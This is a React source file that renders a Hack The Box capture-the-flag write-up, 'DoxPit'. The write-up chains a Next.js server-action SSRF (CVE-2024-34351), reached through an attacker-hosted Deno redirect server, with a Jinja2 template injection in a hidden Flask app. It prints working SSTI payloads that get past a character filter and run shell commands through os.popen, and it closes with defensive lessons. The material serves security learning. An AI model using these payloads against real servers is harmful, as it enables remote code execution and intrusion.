import {
  Stack,
  Code,
  AccordionRoot,
  AccordionItem,
  AccordionItemTrigger,
  Icon,
  Text,
  AccordionItemContent,
  Heading,
  Separator,
  List,
} from "@chakra-ui/react";
import { MdOutlineHideImage, MdOutlineUpgrade } from "react-icons/md";
import { WriteupType } from "./";
import { Hard, JavaScript, Python, RCE, SSTI, SSRF } from "./tags";
import { ImageWithCaption } from "@/components/ImageWithCaption";
import { Codeblock } from "@/components/Codeblock";
import CustomAccordion, { AccordionType } from "@/components/CustomAccordion";
import ExternalLink from "@/components/ExternalLink";
import { GrValidate } from "react-icons/gr";
import { RiFlowChart } from "react-icons/ri";

const reflectionItems = [
  {
    value: "unexposed app",
    icon: <MdOutlineHideImage />,
    title: "Hidden applications can still be vulnerable",
    content: (
      <Stack gap={1}>
        <Text>
          Don't assume that just because an application isn't exposed to the
          user, that it isn't vulnerable. In this case, the Python Flask
          application was hidden behind a basic front-end, but was still
          vulnerable to SSTI. This is a good reminder that you should always
          check the entire codebase for vulnerabilities, not just the parts that
          are exposed to the user.
        </Text>
        <Text>
          This also highlights the importance of not running unnecessary
          services, as the Python Flask application was running on the same
          server as the front-end unnecessarily.
        </Text>
      </Stack>
    ),
  },
  {
    value: "validation",
    icon: <GrValidate />,
    title: "Validation must be comprehensive",
    content: (
      <Stack gap={1}>
        <Text>
          There is no point in having validation if it can be easily bypassed.
          Granted in this case, it wasn't 'easy' per se, but it could still be
          done with the right knowledge. Ideally, we should use a library that
          has been tried and tested, and is known to be secure.
        </Text>
      </Stack>
    ),
  },
  {
    value: "overall-process",
    icon: <RiFlowChart />,
    title: "The importance of knowledge and planning",
    content: (
      <Stack gap={1}>
        <Text>
          In comparison to my earlier challenges, I think I figured out the
          vulnerability in this particular challenge a lot quicker than I would
          have previously. This was due to the fact that I had a better
          understanding of how I should go about undertaking these challenges,
          taking the time to do my recon, plan and research before I even begin
          executing anything.
        </Text>
        <Text>
          Granted, the main challenge in this particular challenge was figuring
          out the SSTI payload - but that would also come with practice.
        </Text>
      </Stack>
    ),
  },
  {
    value: "legacy",
    icon: <MdOutlineUpgrade />,
    title: "Keep your tech stacks up to date!",
    content: (
      <Stack gap={1}>
        <Text>
          The NextJS vulnerability that I exploited was only present in versions
          up to 14.1.0. The vulnerability was patched in 14.1.1, so keeping your
          tech stacks up to date is crucial in ensuring that you are not
          vulnerable to known exploits.
        </Text>
        <Text>
          This is especially important in the case of legacy applications, where
          the tech stack may not be updated as frequently as newer applications.
          This is a prevasive issue in the industry - and is why security is
          becoming such a focus today.
        </Text>
      </Stack>
    ),
  },
];

export const DoxPit: WriteupType = {
  title: "DoxPit",
  slug: "doxpit",
  author: "leanthedev",
  authorLink: "https://app.hackthebox.com/users/1338083",
  challengeLink: "https://app.hackthebox.com/challenges/645",
  tags: [Hard, JavaScript, Python, SSTI, RCE, SSRF],
  timeTaken: "10 hours (that string template injection was a pain)",
  synopsis:
    "A hidden Python Flask application hiding behind a basic front-end that is susceptible to some crazy SSTI.",
  content: (
    <Stack gap={2}>
      <Text>
        This challenge was an interesting one to begin with, given that the repo
        contains two applications. One application is a basic front-end written
        in JavaScript, while the other is a Python Flask application that isn't
        actually exposed to the user. Based on the context of the application, I
        suspect that the currently exposed frontend was hastily put together,
        and the Flask application was meant to be the main, original
        application.
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-1.png"
        caption="The exposed front-end"
      />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Reconnaissance
      </Heading>
      <Text>
        Let's take a look at what we have in the codebase. As from previous
        challenges, I first checked and scoped out where a final goal is - the{" "}
        <Code>flag.txt</Code> was within the root directory of the codebase, and
        the Dockerfile didn't hint at any particular renaming or randomness to
        the file location - other than that the flag is in the root directory.
      </Text>
      <Text>
        Next, I decided to take a look at the exposed front-end. The front-end
        was a simple application that had very little functionality - most of
        the pages on the navbar redirected you to an error page.
      </Text>
      <Text>
        In fact, there was little to no functionality on the front-end, most of
        the code was just HTML and CSS. The only interesting part was some use
        of JavaScript, and a reference to a <Code>doRedirect</Code> function
        that is referenced to the <Code>serverActions.tsx</Code> file. Could be
        worth looking into later.
      </Text>
      <Codeblock
        language="typescript"
        code={`
export async function doRedirect() {
  redirect("/error");
}
      `}
      />
      <Text>
        Moving swiftly on, I decided to take a look at the Flask application.
        The Flask application was also pretty simple, with some basic
        authentication, and the main webpage being some sort of virus scanning
        page, where a user scans a particular directory for viruses.
      </Text>
      <CustomAccordion type={AccordionType.SIDETRACK} title="Authentication">
        <Stack gap={2}>
          <Text>
            Overall, the authentication seemed to be handled relatively well -
            granted there could be some potential vulnerabilities (such as the
            potential of spoofing tokens), but nothing that jumped out at me
            immediately (see code below). Keeping this in mind, but I doubted
            that this would be the main attack vector, if at all involved. On
            top of that, there is no obvious reason why we would want to spoof a
            request anyway - any user can create an account and scan a directory
            for viruses - the main purpose of this application.
          </Text>
          <Codeblock
            language="python"
            widthOffset="70px"
            code={`
def auth_middleware(func):
  def check_user(*args, **kwargs):
    db_session = Database()

    if not session.get("loggedin"):
      if request.args.get("token") and db_session.check_token(request.args.get("token")):
        return func(*args, **kwargs)
      else:
        return redirect("/login")

    return func(*args, **kwargs)

  check_user.__name__ = func.__name__
  return check_user
      `}
          />
        </Stack>
      </CustomAccordion>
      <Text>From here - I notice that there is the code below:</Text>
      <Codeblock
        language="python"
        widthOffset="70px"
        code={`
@web.route("/home", methods=["GET", "POST"])
@auth_middleware
def feed():
  directory = request.args.get("directory")

  if not directory:
    dirs = os.listdir(os.getcwd())
    return render_template("index.html", title="home", dirs=dirs)

  if any(char in directory for char in invalid_chars):
    return render_template("error.html", title="error", error="invalid directory"), 400

  try:
    with open("./application/templates/scan.html", "r") as file:
        template_content = file.read()
        results = scan_directory(directory)
        template_content = template_content.replace("{{ results.date }}", results["date"])
        template_content = template_content.replace("{{ results.scanned_directory }}", results["scanned_directory"])
        return render_template_string(template_content, results=results)
      `}
      />
      <Text>
        The code above is the main function that is called when a user scans a
        directory for viruses. The function takes a directory as an argument
        (with some filtering), and then scans the directory for viruses. The
        results of the scan are then displayed on the page, through the{" "}
        <Code>render_template_string</Code> method. I smell a potential SSTI
        vulnerability here.
      </Text>
      <Text>
        I was also curious what invalid characters were being filtered out:
      </Text>
      <Codeblock
        language="python"
        code={`
invalid_chars = ["{{", "}}", ".", "_", "[", "]","\', "x"]
      `}
      />
      <Text>
        Not too sure why these are being filtered out just yet, but to me it
        does look like some form of SSTI protection.
      </Text>
      <CustomAccordion
        type={AccordionType.SIDETRACK}
        title="Learning about Python's Templating Library"
      >
        <Stack gap={2}>
          <Text>
            Now I wasn't familiar with Python's Templating libraries, so I
            needed to take some time to understand how it worked before I went
            deeper.
          </Text>
          <Text>
            Python's templating library is known as Jinja2. Jinja2 works
            similarly to other templating libraries, such as Handlebars or EJS,
            in that it allows you to inject variables into your HTML. The main
            difference is that Jinja2 uses double curly braces to denote
            variables, and also allows for more complex operations, such as
            loops and conditionals.
          </Text>
          <Text>
            From here, I decided to loook on HackTricks to see if there was any
            potential SSTI payloads that I could use.
          </Text>
          <ImageWithCaption
            imagePath="/images/dox-2.png"
            caption="HackTricks SSTI payloads"
          />
          <Text>
            There were plenty. The filtered character list is now starting to
            make a bit more sense.
          </Text>
          <Text>
            I now wanted to understand what all the <Code>mro</Code> and{" "}
            <Code>__class__</Code> stuff was about. Essentially, the whole idea
            is that everything is an object in Python, and that objects have a
            method resolution order (mro) that determines how the object is
            constructed. The <Code>__class__</Code> attribute is a reference to
            the class that the object was created from. This is important, as it
            allows us to access the class's methods and attributes, which when
            we start stacking all together, can lead to some pretty powerful
            payloads.
          </Text>
          <Text>
            For example, the payload below can start from a string, and then
            access os.system to execute a command:
          </Text>
          <Codeblock
            language="python"
            widthOffset="70px"
            code={`
''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()
          `}
          />
          <Text>
            This was crazy to me. Essentially, we get the string object, ask for
            its class (str), then ask for the method resolution order, and then
            ask for the 396th subclass (which is the subprocess.Popen class). We
            then execute the command "cat flag.txt" and return the output.
          </Text>
          <Text>
            We can use this to execute any command we want on the server, but as
            we'll see later on, it's not quite as simple (subtle foreshadowing).
          </Text>
        </Stack>
      </CustomAccordion>
      <CustomAccordion type={AccordionType.SIDETRACK} title="NextJS CVE">
        <Stack gap={2}>
          <Text>
            As previously mentioned, the front-end had a <Code>doRedirect</Code>{" "}
            function that was referenced to the <Code>serverActions.tsx</Code>{" "}
            file. I decided to take a look at this file to see what was going
            on. Realising that this was a NextJS application, I decided to take
            a look at the NextJS CVEs to see if there was anything that I could
            use to my advantage, as this particular redirect function seemed to
            be a potential attack vector.
          </Text>
          <Text>
            <ExternalLink
              href="https://nvd.nist.gov/vuln/detail/CVE-2024-34351"
              title="CVE-2024-34351"
            />
            . Certainly didn't take too long, and the description of the CVE is
            exactly what I was looking for - being able to redirect to an
            external site. On top of this, we were on NextJS 14.1.0 - the
            vulnerability was not patched until 14.1.1, nice!
          </Text>
          <Text>
            In a nutshell, the vulnerability allowed for an attacker to redirect
            to an external site by spoofing the Host and Origin headers. This
            worked as the NextJS application was not properly validating the
            Host and Origin headers, and would redirect to the site specified in
            the headers, thinking that it was a valid request.
          </Text>
        </Stack>
      </CustomAccordion>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Planning
      </Heading>
      <Text>
        From here, I decided to plan out my attack. I knew that I had to first
        exploit the NextJS vulnerability, as that was seemingly my only
        entrypoint. I could then potentially spoof the request to redirect to
        the Flask application, and then exploit the SSTI vulnerability via the
        innocuous NextJS frontend. We will probably have to figure out a way to
        circumvent the filtered characters list, however.
      </Text>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Execution
      </Heading>
      <Text>
        Let's exploit the NextJS vulnerability first. I first decided to see if
        we could indeed get this to work, so I spun up Burp Suite interceptor to
        intercept requests. I knew that the redirect was called whenever one of
        the links within the tables was clicked, so that was what I did.
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-3.png"
        caption="Intercepting the request"
      />
      <Text>
        As outlined in the research I did earlier, I needed to modify my Host
        and Origin headers - so I pointed them both to example.com to see if the
        redirect would work. Pay attention that the Host header needs to be set
        without the protocol (http/https).
      </Text>
      <Text>
        This didn't quite work unfortunately, I was still being redirected to
        the <Code>/error</Code> page, as it should've been as normal. I needed
        to take a deeper look into how this vulnerability worked.
      </Text>
      <CustomAccordion
        type={AccordionType.SIDETRACK}
        title="NextJS Vulnerability"
      >
        <Stack gap={2}>
          <Text>
            So taking a deeper look into this particular NextJS vulnerability, I
            found the original blog from{" "}
            <ExternalLink
              href="https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io"
              title="AssetNote"
            />{" "}
            of the vulnerability.
          </Text>
          <Text>
            From the website, we know that three things must be present for this
            exploit to work:
          </Text>
          <List.Root>
            <List.Item>A server action is defined</List.Item>
            <List.Item>
              The server action redirects to a URL starting with <Code>/</Code>
            </List.Item>
            <List.Item>
              We are able to specify a custom <Code>Host</Code> header while
              accessing the application.
            </List.Item>
          </List.Root>
          <Text>
            We do in fact have all three of these things, so this should be a
            go-ahead.
          </Text>
          <Text>
            The main logic that NextJS follows when calling{" "}
            <Code>redirect</Code> is as follows, summarised from the AssetNote
            blog:
          </Text>
          <List.Root>
            <List.Item>
              The server will first do a preflight HEAD request to the URL,
              checking if it will return a <Code>Content-Type</Code> of{" "}
              <Code>RSC_CONTENT_TYPE_HEADER</Code> (i.e. text/x-component).
            </List.Item>
            <List.Item>
              The content of the GET request to the URL specified will then be
              returned in the response.
            </List.Item>
          </List.Root>
          <Text>
            So essentially, the NextJS server will fetch the result of the
            redirect server-side, and then return the content to the client.
          </Text>
          <Text>
            With this knowledge of how the redirect works, I figured it wasn't
            as easy as just spoofing the Host and Origin headers - I needed a
            quick and dirty server that could return the correct content type on
            the preflight request, before re-directing via the GET request.
          </Text>
        </Stack>
      </CustomAccordion>
      <Text>
        With my newfound knowledge in mind, I spun up a quick server on{" "}
        <ExternalLink href="https://deno.com/" title="Deno" />, which allows me
        to quickly create a JS server and deploy it with little setup. Using a
        POC from the CVE, I spun this up on Deno:
      </Text>
      <Codeblock
        language="javascript"
        code={`
Deno.serve((request: Request) => {
  console.log(
    "Request received: " +
      JSON.stringify({
        url: request.url,
        method: request.method,
        headers: Array.from(request.headers.entries()),
      })
  );

  if (request.method === "HEAD") {
    return new Response(null, {
      headers: {
        "Content-Type": "text/x-component",
      },
    });
  }
  if (request.method === "GET") {
    return new Response(null, {
      status: 302,
      headers: {
        Location: "https://example.com"
      },
    });
  }
});
`}
      />
      <Text>
        I then set my Host and Origin headers to point to the Deno server:
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-4.png"
        caption="Setting the Host and Origin headers"
      />
      <ImageWithCaption imagePath="/images/dox-5.png" caption="Success!" />
      <Text>
        The redirect worked! I was now being redirected to example.com. I was
        now in a position to access the Python Flask application by moving the
        redirect to the Flask application on port 3000.
      </Text>
      <Text>
        Another advantage of using the Deno server was that I could setup Burp
        Suite with a repeater of the spoofed request, without me needing to
        access the application each time and edit the request, since the Deno
        server would give me a static URL.
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-6.png"
        caption="Pointing to Flask application"
      />
      <Text>
        Alright we have in into the Flask application that was previously
        inaccessible. We now need to register and login, but from the
        reconnaissance, this wasn't going to be difficult at all. There is a
        route that allows us to register, called <Code>/register</Code> (crazy),
        and it takes in the username and password via the request arguments.
      </Text>
      <Text>
        Replacing the redirected location URL with:{" "}
        <Code>http://0.0.0.0:3000/register?username=a&password=a</Code> gives
        us:
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-7.png"
        caption="Registering a user"
      />
      <Text>
        We now have a token, and based on the auth middleware as seen before, we
        know that to actually be able to scan a directory (where we will execute
        our potential SSTI), we need to provide a token. This should be pretty
        easy with the following location URL now:{" "}
        <Code>
          http://0.0.0.0:3000/home?token=62f341a9ce71fdfc4e51f3c8a3c2f7c5
        </Code>
      </Text>
      <ImageWithCaption imagePath="/images/dox-8.png" caption="We're in!" />
      <Text>
        We are now in the main page of the Flask application. We can now scan a
        directory for viruses, and this is where we should be able to exploit
        the SSTI vulnerability (finally).
      </Text>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Trying to SSTI
      </Heading>
      <Text>
        Now we already know that a potential SSTI vulnerability would exist,
        since we as a user can specify any 'directory' to 'scan'. From the
        relevant code, there is a <Code>scan_directory()</Code> function that is
        being called, which could be some potential input filtering:
      </Text>
      <Codeblock
        language="python"
        code={`
def scan_directory(directory):
    scan_results = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                file_hash = calculate_sha256(file_path)
                if file_hash in BLACKLIST_HASHES:
                    scan_results.append(f"Malicious file detected: {file} ({file_hash})")
                else:
                    scan_results.append(f"File is safe: {file} ({file_hash})")
            except Exception as e:
                scan_results.append(f"Error scanning file {file}: {str(e)}")

    return {
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scanned_directory": directory,
        "report": scan_results
    }
`}
      />
      <Text>
        Yeah... never mind - this is just matching against some known bad hashes
        of files, and then returning the results. I doubt an SSTI payload would
        be hashed against here.
      </Text>
      <Text>
        Now, I do also know that there are the filtered characters that we need
        to work around, so let's just see what happens when we try to put those
        characters in for intel. The payload is <Code>{"{{"}</Code>.
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-9.png"
        caption="Invalid input characters leads to invalid directory"
      />
      <Text>
        As expected, if our SSTI payload contains any of the filtered
        characters, we can't proceed. We need to find a way to circumvent this.
      </Text>
      <Text>
        Since I expect I will need a LOT of testing to get this right, I moved
        over to the local instance, removing the invalid character check to test
        my approach.
      </Text>
      <Text>
        From the HackTricks SSTI payload and{" "}
        <ExternalLink
          href="https://0day.work/jinja2-template-injection-filter-bypasses/"
          title="this blog"
        />
        , I learnt that in the case of Flask applications, we can use{" "}
        <Code>request.application</Code> to access the global context of the
        application. From there, we can access <Code>__globals__</Code>, which
        contains all the global variables and built-in objects and functions
        available to the application scope. This includes built-ins, like{" "}
        <Code>print</Code>, but more importantly, it includes{" "}
        <Code>__import__</Code>.
      </Text>
      <Text>
        From this, I can craft a payload that will allow me to import the os
        module, and then execute whatever command I want using{" "}
        <Code>popen</Code>. We're using <Code>popen</Code> here as it allows us
        to execute a command and return the output without too much additional
        fluff. We know from the Dockerfile that the flag is in the root
        directory of the server, so we set up the following URL to deliver the
        payload, testing locally each time to ensure it is still working as
        intended (omitting the actual URL since it will be the same):
      </Text>
      <Codeblock
        language=""
        code={`
{{request.application.__globals__['__builtins__'].__import__('os').popen('ls /flag* | xargs cat').read()}}
`}
      />
      <ImageWithCaption
        imagePath="/images/dox-10.png"
        caption="Successful first payload"
      />
      <Text>
        Alright, now we have to get past each of the filters. The first of which
        is the <Code>{"{{}}"}</Code>. Pretty clearly - this is how most SSTI
        attacks begin, which is why it is filtered out. To bypass this (from
        HackTricks), we can use the following template: .
        <Code>{"{% with a = ... %}{% print(a) %}{% endswith %}"}</Code>
      </Text>
      <Text>
        This is typically used to execute logic, as opposed to directly printing
        values like the double curly braces usually do. We can use this to our
        advantage, however. Trying it out with our payload, we get the
        following:
      </Text>
      <Codeblock
        language=""
        code={`
{%with a = request.application.__globals__['__builtins__'].__import__('os').popen('ls /flag* | xargs cat').read()%}{%print(a)%}{%endwith%}
`}
      />
      <Text>
        Testing locally, our payload still works just fine without the double
        curly braces now. Next, we need to deal with the period character. This
        is a bit more tricky, as the period is used to access object attributes
        in Jinja2. To bypass this, we could use something along the lines of{" "}
        <Code>{'request["__class__"'}</Code> in place of{" "}
        <Code>{"request.__class__"}</Code>, but looking further along our
        filtered character list, we know that square brackets are also filtered
        out.
      </Text>
      <Text>
        Instead, we could use Jinja2's <Code>attr</Code> filter, which allows us
        to access object attributes in a similar way to the period character. So
        something like <Code>request.application</Code> would become{" "}
        <Code>{"request|attr('application')"}</Code>. To kill another bird with
        the same stone, we know we're not allowed to use the square bracket. To
        bypass this, we can use the <Code>__getitem__</Code> method, which is
        the same as using square brackets. Let's put it all together
      </Text>
      <Codeblock
        language=""
        code={`
{%with a=(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__'))|attr('__getitem__')('__import__')('os')|attr('popen')('ls /flag* | xargs cat')|attr('read')()%}
{%print(a)%}
{%endwith%}
`}
      />
      <Text>
        We're still good! No more periods and square brackets in our payload.
        Next we have to deal with the underscore - and there a LOT of them. What
        we will do to bypass this is to pass in any attributes with dunders
        (double underscores) as the params of the query, and use{" "}
        <Code>request.get.param</Code> to access them. This will allow us to
        bypass the underscore filter. Of course, <Code>request.args.param</Code>{" "}
        will need to be substituted with{" "}
        <Code>attr(request|attr('args')|attr('get')('param'))</Code> to bypass
        our current filters.
      </Text>
      <Text>
        The alternative method to this, could be to encode the underscores as
        hex values, and then decode them in the payload. Unfortunately, this
        wouldn't work either, as we are not allowed backslashes or the 'x'
        character.
      </Text>
      <Codeblock
        language=""
        code={`
"http://0.0.0.0:3000/home?token=6a7b9f1ebe6d6beff2a07ec53ef1c907&directory={% with a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('p1')))|attr(request|attr('args')|attr('get')('p2')))(request|attr('args')|attr('get')('p3'))|attr(request|attr('args')|attr('get')('p2')))(request|attr('args')|attr('get')('p4'))('os')|attr('popen')('ls /flag* | xargs cat')|attr('read')()%}{%print(a)%}{%endwith%}&p1=__globals__&p2=__getitem__&p3=__builtins__&p4=__import__"
`}
      />
      <Text>
        And that is our final payload. We have successfully bypassed the filters
        - that only took 5 hours for me to figure out. Let's test it out:
      </Text>
      <ImageWithCaption
        imagePath="/images/dox-11.png"
        caption="Flag acquired!"
      />
    </Stack>
  ),
  reflection: (
    <Stack width="full" minW="100%">
      <AccordionRoot collapsible defaultValue={["info"]} variant="enclosed">
        {reflectionItems.map((item) => (
          <AccordionItem key={item.value} value={item.value} py={2}>
            <AccordionItemTrigger
              cursor="pointer"
              textAlign="left"
              fontWeight={800}
              fontSize="20px"
            >
              <Icon fontSize="28px" color="teal">
                {item.icon}
              </Icon>
              {item.title}
            </AccordionItemTrigger>
            <AccordionItemContent>{item.content}</AccordionItemContent>
          </AccordionItem>
        ))}
      </AccordionRoot>
    </Stack>
  ),
};
